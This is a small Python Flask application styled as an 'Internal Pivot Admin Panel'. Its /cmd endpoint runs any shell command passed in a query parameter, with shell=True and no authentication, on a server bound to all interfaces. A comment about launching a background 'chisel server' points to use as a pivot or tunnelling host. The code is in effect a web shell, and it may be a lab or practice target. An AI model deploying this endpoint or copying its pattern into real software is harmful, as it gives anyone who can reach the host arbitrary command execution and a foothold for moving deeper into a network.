from flask import Flask, request, Response
import subprocess

app = Flask(__name__)

@app.route('/')
def index():
    return '''<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Internal Pivot Admin Panel</title>
    <style>body{font-family:Arial,sans-serif;background:#f4f6f8;color:#222;padding:2rem;}header{margin-bottom:1.5rem;}h1{color:#1f2937;}code{background:#e2e8f0;padding:0.2rem 0.4rem;border-radius:4px;}</style>
  </head>
  <body>
    <header>
      <h1>Internal Pivot Admin Panel</h1>
      <p>Welcome to the internal pivot management dashboard. Use the command tool to run maintenance checks.</p>
    </header>
    <section>
      <h2>System Utilities</h2>
      <p>Available tools:</p>
      <ul>
        <li><strong>Command Execution</strong> — <code>/cmd?cmd=&lt;command&gt;</code></li>
      </ul>
    </section>
  </body>
</html>'''

@app.route('/cmd')
def cmd():
    cmd = request.args.get('cmd', '')
    if not cmd:
        return Response('Missing cmd parameter', mimetype='text/plain')
    try:
        # For background daemons like chisel server
        if cmd.strip().endswith('&'):
            cmd = cmd.strip().rstrip('&').strip()
            subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return Response('started in background\n', mimetype='text/plain')
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True, timeout=10)
    except subprocess.CalledProcessError as exc:
        output = exc.output or str(exc)
    return Response(output, mimetype='text/plain')


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
